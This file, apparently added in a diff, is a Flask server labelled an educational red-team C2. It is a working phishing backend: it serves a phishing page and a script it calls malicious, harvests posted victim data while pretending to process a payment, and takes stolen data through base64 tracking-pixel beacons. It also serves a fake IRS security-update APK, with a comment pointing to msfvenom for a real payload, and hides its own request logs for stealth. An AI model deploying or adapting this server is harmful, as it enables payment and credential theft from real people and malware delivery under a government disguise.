@@ -1,0 +1,220 @@
+#!/usr/bin/env python3
+"""
+Red Team Exercise C2 Server
+Educational penetration testing infrastructure
+"""
+
+from flask import Flask, request, jsonify, send_from_directory, make_response
+from flask_cors import CORS
+import json
+import datetime
+import os
+import base64
+from werkzeug.serving import WSGIRequestHandler
+
+app = Flask(__name__)
+# Enable CORS for cross-origin requests
+CORS(app, origins=['http://localhost:8000', 'http://127.0.0.1:8000', 'http://localhost:9000', 'http://127.0.0.1:9000'])
+
+# Configuration
+DATA_LOG_FILE = 'redteam_data.json'
+APK_FILE = 'irs_security_update.apk'
+
+class RedTeamRequestHandler(WSGIRequestHandler):
+    """Custom request handler for logging"""
+    def log_request(self, code='-', size='-'):
+        # Suppress normal request logging for stealth
+        pass
+
+def log_data(data_type, data, request):
+    """Log collected data with metadata"""
+    entry = {
+        'timestamp': datetime.datetime.now().isoformat(),
+        'type': data_type,
+        'data': data,
+        'source_ip': request.remote_addr,
+        'user_agent': request.headers.get('User-Agent'),
+        'referrer': request.headers.get('Referer'),
+        'x_forwarded_for': request.headers.get('X-Forwarded-For')
+    }
+    
+    with open(DATA_LOG_FILE, 'a') as f:
+        json.dump(entry, f)
+        f.write('\n')
+    
+    print(f"[+] {data_type.upper()} collected from {request.remote_addr}")
+    return entry
+
+@app.route('/')
+def index():
+    """Serve the phishing site"""
+    log_data('page_visit', {'page': 'index'}, request)
+    return send_from_directory('.', 'index.html')
+
+@app.route('/script.js')
+def script():
+    """Serve the malicious JavaScript"""
+    return send_from_directory('.', 'script.js')
+
+@app.route('/collect', methods=['POST'])
+def collect_data():
+    """Data collection endpoint"""
+    try:
+        data = request.get_json()
+        entry = log_data('data_collection', data, request)
+        
+        # Respond as if processing payment
+        return jsonify({
+            "status": "success", 
+            "message": "Payment processing initiated",
+            "reference": entry['timestamp']
+        })
+    except Exception as e:
+        print(f"[-] Error collecting data: {e}")
+        return jsonify({"status": "error", "message": "Processing failed"}), 500
+
+@app.route('/track.gif')
+@app.route('/pixel.png')
+def tracking_pixel():
+    """Fallback data collection via image beacon"""
+    data = request.args.get('data', '')
+    encoded_data = request.args.get('t', '')  # Base64 encoded data
+    
+    if data:
+        try:
+            decoded_data = json.loads(data)
+            log_data('image_beacon', decoded_data, request)
+        except Exception as e:
+            log_data('image_beacon', {'raw': data, 'decode_error': str(e)}, request)
+    elif encoded_data:
+        try:
+            decoded_b64 = base64.b64decode(encoded_data + '==').decode('utf-8')
+            parsed_data = json.loads(decoded_b64)
+            log_data('encoded_beacon', parsed_data, request)
+        except Exception as e:
+            log_data('encoded_beacon', {'raw': encoded_data[:100], 'decode_error': str(e)}, request)
+    else:
+        # Log beacon hit even without data
+        log_data('beacon_hit', {'endpoint': request.endpoint}, request)
+    
+    # Return 1x1 transparent GIF for both endpoints
+    gif_data = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
+    response = make_response(gif_data)
+    response.headers['Content-Type'] = 'image/gif'
+    response.headers['Cache-Control'] = 'no-cache'
+    return response
+
+@app.route('/download/irs_security_update.apk')
+def download_apk():
+    """Serve the malicious APK"""
+    log_data('apk_download', {'filename': APK_FILE}, request)
+    
+    if os.path.exists(APK_FILE):
+        return send_from_directory('.', APK_FILE, as_attachment=True)
+    else:
+        # Generate minimal APK on demand if not exists
+        generate_test_apk()
+        return send_from_directory('.', APK_FILE, as_attachment=True)
+
+@app.route('/stats')
+def stats():
+    """View collected statistics"""
+    try:
+        stats = {
+            'total_entries': 0,
+            'visitors': set(),
+            'data_types': {},
+            'user_agents': {}
+        }
+        
+        if os.path.exists(DATA_LOG_FILE):
+            with open(DATA_LOG_FILE, 'r') as f:
+                for line in f:
+                    try:
+                        entry = json.loads(line.strip())
+                        stats['total_entries'] += 1
+                        stats['visitors'].add(entry.get('source_ip', 'unknown'))
+                        
+                        data_type = entry.get('type', 'unknown')
+                        stats['data_types'][data_type] = stats['data_types'].get(data_type, 0) + 1
+                        
+                        ua = entry.get('user_agent', 'unknown')[:50]
+                        stats['user_agents'][ua] = stats['user_agents'].get(ua, 0) + 1
+                        
+                    except json.JSONDecodeError:
+                        continue
+        
+        stats['unique_visitors'] = len(stats['visitors'])
+        stats['visitors'] = list(stats['visitors'])
+        
+        return jsonify(stats)
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/data')
+def view_data():
+    """View all collected data (for exercise review)"""
+    try:
+        data = []
+        if os.path.exists(DATA_LOG_FILE):
+            with open(DATA_LOG_FILE, 'r') as f:
+                for line in f:
+                    try:
+                        data.append(json.loads(line.strip()))
+                    except json.JSONDecodeError:
+                        continue
+        return jsonify(data)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+def generate_test_apk():
+    """Generate a test APK for educational purposes"""
+    print("[*] Generating test APK...")
+    
+    # For educational purposes, create a harmless APK
+    # In real scenario, use msfvenom or custom build
+    apk_content = base64.b64decode(
+        'UEsDBBQAAAAIAAoAAQAAAAAAAAAAAAAAAAAAEAAAAE1FVEEtSU5GL01BTklGRVNULk1G'
+        'UEsBAhQAFAAAAAgACgABAAAAAAAAAAAAAAAAAAEAAAAQABgAAAAAAAABAAAAAA=='
+        'TUVUQUwtSU5GL01BTklGRVNULk1GUEsFBgAAAAABAAEAVgAAADYAAAAAAA=='
+    )
+    
+    with open(APK_FILE, 'wb') as f:
+        f.write(apk_content)
+    
+    print(f"[+] Test APK generated: {APK_FILE}")
+
+@app.route('/clear')
+def clear_data():
+    """Clear collected data (for exercise cleanup)"""
+    try:
+        if os.path.exists(DATA_LOG_FILE):
+            os.remove(DATA_LOG_FILE)
+        return jsonify({'status': 'Data cleared successfully'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+if __name__ == '__main__':
+    print("="*50)
+    print("RED TEAM EXERCISE C2 SERVER")
+    print("="*50)
+    print(f"[*] Starting server...")
+    print(f"[*] Data will be logged to: {DATA_LOG_FILE}")
+    print(f"[*] C2 Server: http://localhost:8888")
+    print(f"[*] Statistics: http://localhost:8888/stats")
+    print(f"[*] View data: http://localhost:8888/data")
+    print(f"[*] Clear data: http://localhost:8888/clear")
+    print("="*50)
+    
+    # Create APK if it doesn't exist
+    if not os.path.exists(APK_FILE):
+        generate_test_apk()
+    
+    # Run with custom request handler for stealth
+    app.run(
+        host='0.0.0.0', 
+        port=8888, 
+        debug=False,
+        request_handler=RedTeamRequestHandler
+    )
